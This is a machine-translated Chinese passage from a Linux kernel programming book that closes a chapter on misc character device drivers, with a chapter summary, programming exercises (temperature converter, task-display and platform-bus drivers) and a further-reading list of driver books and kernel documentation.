这一章首先介绍了设备基础，重要的是，现代 LDM 的非常简单的要点。然后，您学习了如何编写简单的第一个字符设备驱动程序，并注册到内核的`misc` 框架中。在此过程中，您还理解了流程、驱动程序和内核 VFS 之间的联系。在用户和内核地址空间之间复制数据至关重要；我们看到了如何做到这一点。更全面的演示`misc`驱动程序(我们的“秘密”驱动程序)向您展示了如何在用户和内核空间之间执行输入/输出(读取和写入)传输数据。本章的一个关键部分是最后一节，在这一节中，您学习了(至少是开始)安全性和驱动程序；一个“黑客”甚至演示了一次*私人*攻击！

如前所述，在 Linux 上编写驱动程序这个庞大的主题还有很多内容；的确，整本书都致力于此！务必查看本章的*进一步阅读*部分，查找相关书籍和在线参考资料。

在接下来的章节中，您将了解到驱动程序作者的一项关键任务-如何将您的设备驱动程序与用户空间进程有效地连接起来；详细介绍并对比了几种有用的方法。确保你清楚本章的内容，做给定的练习，复习*进一步阅读*资源，然后进入下一个。

# 问题

1.  加载第一个`miscdrv` 骨架`misc`驱动内核模块，并在上面发布`lseek(2)`；会发生什么？(成功了吗？`lseek`的回报率是多少？)如果没有，好吧，你会怎么解决这个问题？
2.  编写一个`misc`类角色驱动程序，表现为一个简单的转换器程序(假设其路径名为`/dev/convert`)。例如，以华氏单位写入温度，它应该返回(写入内核日志)以摄氏度为单位的温度。因此，执行`echo 98.6 > /dev/convert`应该会导致值`37 C`被写入内核日志。此外，请执行以下操作:
    1.  验证传递给驱动程序的数据是数值。
    2.  您将如何处理浮点值？(提示:参考 *Linux 内核编程*、*第 5 章*、*写你的第一个内核模块 LKMs–第 2 部分【内核中不允许的*浮点】一节。*)*
3.  编写“任务显示”驱动程序；在这里，我们希望用户空间进程为其编写一个线程(或进程)PID。当您现在从驱动程序的设备节点读取时(假设它的路径名是`/dev/task_display`)，您应该会收到关于任务的详细信息(当然是从它的任务结构中提取的)。例如，先做`echo 1 > /dev/task_display`后做`cat /dev/task_display`应该让驱动程序向内核日志发出 PID 1 的任务细节。不要忘记添加有效性检查(检查 PID 是否有效，等等)。
4.  (高级一点:)写一个“合适的”LDM 驱动程序；这里涉及的`misc`驱动程序确实向内核的`misc`框架注册了，但是简单地、隐式地使用了原始字符接口作为总线。LDM 更喜欢驱动程序必须注册内核框架和总线驱动程序。因此，编写一个向内核的`misc`框架和平台总线注册自己的“演示”驱动程序。这将涉及到创建一个假的平台设备。
    ( *注意以下 t* *ips* :
    a)务必参考[第 2 章](2.html)、*用户-内核通信路径*，特别是*创建简单平台设备*和*平台设备*部分。
    b)这个驱动的可能解决方案可以在这里找到:`solutions_to_assgn/ch12/misc_plat/`。)

You will find some of the questions answered in the book's GitHub repo: [https://github.com/PacktPublishing/Linux-Kernel-Programming-Part-2/tree/main/solutions_to_assgn](https://github.com/PacktPublishing/Linux-Kernel-Programming-Part-2/tree/main/solutions_to_assgn).

# 进一步阅读

*   Linux 设备驱动程序书籍:

    *   *Linux 设备驱动开发*，John Madieu，Packt，2017 年 10 月:[https://www . Amazon . in/Linux-设备-驱动-开发-Madieu/DP/1785280007/ref = Sr _ 1 _ 2？关键词= Linux+设备+驱动&qid = 1555486515&s = books&Sr = 1-2](https://www.amazon.in/Linux-Device-Drivers-Development-Madieu/dp/1785280007/ref=sr_1_2?keywords=linux+device+driver&qid=1555486515&s=books&sr=1-2)；出色的报道，以及最近的报道(截至本文撰写之时；它涵盖了 4.13 内核)
    *   *嵌入式处理器 Linux 驱动开发-第二版:学习用内核 4.9 开发嵌入式 Linux 驱动 LTS* ，Alberto Liberal de los Rios:[https://www . Amazon . in/Linux-驱动-开发-嵌入式-处理器-电子书/dp/B07L512BHG/ref=sr_1_6？crid = 3rlfzqxgamf 4&关键词= Linux+驱动+开发+嵌入式&qid = 1555486342&s = books&sprefix = Linux+驱动+% 2Cstripbooks % 2c 270&Sr = 1-6-catcorr](https://www.amazon.in/Linux-Driver-Development-Embedded-Processors-ebook/dp/B07L512BHG/ref=sr_1_6?crid=3RLFFZQXGAMF4&keywords=linux+driver+development+embedded&qid=1555486342&s=books&sprefix=linux+driver+%2Cstripbooks%2C270&sr=1-6-catcorr)；非常好，也是最近的(4.9 内核)
    *   *必不可少的 Linux 设备驱动*，Sreekrishnan Venkateswaran，Pearson:[https://www . Amazon . in/必不可少-驱动-Prentice-Software-Development/DP/0132396556/ref = TMM _ HRD _ swatch _ 0？_ encoding = UTF8&qid =&Sr =](https://www.amazon.in/Essential-Drivers-Prentice-Software-Development/dp/0132396556/ref=tmm_hrd_swatch_0?_encoding=UTF8&qid=&sr=)；简单的优秀，广泛的覆盖
    *   *Linux 设备驱动*，Rubini，Hartmann，Corbet，第三版:[https://www . Amazon . in/Linux-设备-驱动-内核-硬件/dp/8173668493/ref=sr_1_1？关键词= Linux+设备+驱动&qid = 1555486515&s = books&Sr = 1-1](https://www.amazon.in/Linux-Device-Drivers-Kernel-Hardware/dp/8173668493/ref=sr_1_1?keywords=linux+device+driver&qid=1555486515&s=books&sr=1-1)；古老的——著名的 LDD3 书

*   官方内核文档:
    *   Linux 内核设备模型:[https://www . Kernel . org/doc/html/latest/driver-API/driver-Model/overview . html # the-Linux-内核-设备模型](https://www.kernel.org/doc/html/latest/driver-api/driver-model/overview.html#the-linux-kernel-device-model)。
    *   内核驱动 API 手册；这是在最近的一个 Linux 内核源码树内做`make pdfdocs`生成的 PDF 文档之一。

    *   弃用的接口、语言特性、属性和约定:[https://www . kernel . org/doc/html/latest/process/弃用. html #弃用-接口-语言-特性-属性-和约定](https://www.kernel.org/doc/html/latest/process/deprecated.html#deprecated-interfaces-language-features-attributes-and-conventions)。

*   实用教程:
    *   *设备驱动程序，第 8 部分:访问 x86 特定的 I/O 映射硬件*，Anil K Pugalia，OpenSourceForU，2011 年 7 月:[https://OpenSourceForU . com/2011/07/访问 x86 特定的 io 映射硬件 in-linux/](https://opensourceforu.com/2011/07/accessing-x86-specific-io-mapped-hardware-in-linux/)
    *   用户空间设备驱动程序；查看克里斯·西蒙兹的有趣视频演示:*如何避免编写嵌入式 Linux 的设备驱动程序*:[https://www.youtube.com/watch?v=QIO2pJqMxjE&t = 909s](https://www.youtube.com/watch?v=QIO2pJqMxjE&t=909s)**